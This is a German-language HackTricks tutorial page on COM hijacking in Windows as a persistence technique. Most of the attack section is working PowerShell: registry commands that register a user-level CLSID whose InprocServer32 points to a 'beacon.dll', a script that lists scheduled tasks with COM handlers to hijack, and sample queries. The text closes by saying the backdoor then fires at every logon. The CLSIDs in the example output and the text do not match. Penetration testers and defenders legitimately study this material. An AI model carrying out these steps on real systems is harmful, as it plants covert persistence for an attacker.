# COM Hijacking

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>

### Suche nach nicht vorhandenen COM-Komponenten

Da die Werte von HKCU von den Benutzern geändert werden können, kann **COM Hijacking** als **persistenter Mechanismus** verwendet werden. Mit `procmon` ist es einfach, gesuchte COM-Registrierungen zu finden, die nicht existieren und die ein Angreifer erstellen könnte, um persistenz zu erreichen. Filter:

* **RegOpenKey**-Operationen.
* bei denen das _Ergebnis_ **NAME NOT FOUND** ist.
* und der _Pfad_ mit **InprocServer32** endet.

Sobald Sie sich entschieden haben, welche nicht vorhandene COM-Komponente Sie imitieren möchten, führen Sie die folgenden Befehle aus. _Seien Sie vorsichtig, wenn Sie sich entscheiden, eine COM-Komponente zu imitieren, die alle paar Sekunden geladen wird, da dies übertrieben sein könnte._&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackbare Task Scheduler COM-Komponenten

Windows-Aufgaben verwenden benutzerdefinierte Trigger, um COM-Objekte aufzurufen, und da sie über den Taskplaner ausgeführt werden, ist es einfacher vorherzusagen, wann sie ausgelöst werden.

<pre class="language-powershell"><code class="lang-powershell"># COM-CLSIDs anzeigen
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Aufgabenname: " $Task.TaskName
Write-Host "Aufgabenpfad: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Beispiel-Ausgabe:
<strong># Aufgabenname:  Beispiel
</strong># Aufgabenpfad:  \Microsoft\Windows\Beispiel\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [mehr wie das vorherige...]</code></pre>

Durch Überprüfen der Ausgabe können Sie eine auswählen, die beispielsweise **jedes Mal ausgeführt wird, wenn sich ein Benutzer anmeldet**.

Suchen Sie nun nach der CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und in HKLM und HKCU. In der Regel stellen Sie fest, dass der Wert in HKCU nicht vorhanden ist.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dann können Sie einfach den HKCU-Eintrag erstellen und jedes Mal, wenn sich der Benutzer anmeldet, wird Ihre Hintertür aktiviert.

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
